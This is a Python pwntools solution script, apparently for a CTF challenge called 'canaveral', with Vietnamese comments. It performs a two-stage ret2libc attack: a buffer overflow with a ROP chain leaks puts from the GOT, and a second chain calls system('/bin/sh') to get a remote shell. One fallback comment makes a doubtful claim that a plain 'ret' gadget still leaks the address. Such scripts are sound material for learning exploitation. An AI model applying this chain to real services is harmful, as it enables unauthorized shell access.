from pwn import *

# --- Cấu hình ---
HOST = 'chal.sunshinectf.games'
PORT = 25603
BINARY_NAME = './canaveral'
LIBC_NAME = './libc.so.6' # BẠN CẦN CÓ FILE NÀY

elf = context.binary = ELF(BINARY_NAME, checksec=False)
libc = ELF(LIBC_NAME, checksec=False)

p = remote(HOST, PORT)

# --- Tự động tìm Gadgets và địa chỉ trong file ELF ---
rop_elf = ROP(elf)
# Chúng ta vẫn cần 'pop rdi; ret' để đặt tham số cho puts
# Nếu ROPgadget không tìm thấy, có thể nó vẫn tồn tại.
# Nếu script này vẫn lỗi 'NoneType', chúng ta cần tìm gadget thủ công
# Hoặc thử một gadget chỉ có 'ret' để căn chỉnh stack.
try:
    pop_rdi = rop_elf.find_gadget(['pop rdi', 'ret'])[0]
except TypeError:
    log.critical("Không tìm thấy gadget 'pop rdi; ret' trong binary. Thử một gadget 'ret' đơn giản để căn chỉnh stack.")
    pop_rdi = rop_elf.find_gadget(['ret'])[0] # Kỹ thuật thay thế, sẽ gọi puts(rác) nhưng vẫn leak được

puts_plt = elf.plt['puts']   # Địa chỉ của puts trong PLT (Procedure Linkage Table)
puts_got = elf.got['puts']   # Địa chỉ của puts trong GOT (Global Offset Table)
vuln_addr = elf.symbols['vuln'] # Địa chỉ hàm vuln

log.info(f"puts@plt: {hex(puts_plt)}")
log.info(f"puts@got: {hex(puts_got)}")
log.info(f"vuln: {hex(vuln_addr)}")
log.info(f"pop rdi; ret: {hex(pop_rdi)}")

# --- Giai đoạn 1: Leak địa chỉ của puts trong libc ---
padding = b'A' * 80

log.info("Giai đoạn 1: Gửi payload để leak địa chỉ libc")
# ROP chain để gọi puts(puts_got)
rop_chain_leak = b''
rop_chain_leak += p64(pop_rdi)       # Đặt tham số đầu tiên cho puts
rop_chain_leak += p64(puts_got)      # Tham số là địa chỉ của puts trong GOT
rop_chain_leak += p64(puts_plt)      # Gọi hàm puts
rop_chain_leak += p64(vuln_addr)     # Sau khi puts xong, gọi lại vuln để tấn công lần 2

payload1 = padding + rop_chain_leak

p.sendlineafter(b'sequence: ', payload1)

# Đọc output của puts()
# Dòng đầu tiên là "Successful launch!..."
p.recvline()
# Dòng tiếp theo chính là địa chỉ của puts trong libc
leaked_puts_raw = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_raw.ljust(8, b'\x00'))
log.success(f"Leaked puts address in libc: {hex(leaked_puts_addr)}")

# --- Giai đoạn 2: Tính toán địa chỉ và lấy shell ---
log.info("Giai đoạn 2: Tính toán địa chỉ và gửi ROP chain cuối cùng")

# Tính địa chỉ base của libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.success(f"Libc base address: {hex(libc.address)}")

# Lấy địa chỉ của system, /bin/sh và gadget từ libc
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# Tìm 'pop rdi; ret' bên trong libc
rop_libc = ROP(libc)
pop_rdi_libc = rop_libc.find_gadget(['pop rdi', 'ret'])[0]

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")
log.info(f"'pop rdi; ret' in libc: {hex(pop_rdi_libc)}")

# Xây dựng ROP chain cuối cùng để gọi system('/bin/sh')
rop_chain_shell = b''
# Thêm một 'ret' gadget để căn chỉnh stack (do một số issue của glibc 2.31+)
ret_gadget = pop_rdi_libc + 1 # Địa chỉ của ret ngay sau pop rdi
rop_chain_shell += p64(ret_gadget)
rop_chain_shell += p64(pop_rdi_libc)
rop_chain_shell += p64(bin_sh_addr)
rop_chain_shell += p64(system_addr)

payload2 = padding + rop_chain_shell

# vuln() đang chạy lần thứ 2, gửi payload cuối cùng
p.sendlineafter(b'sequence: ', payload2)

# Lấy shell
p.interactive()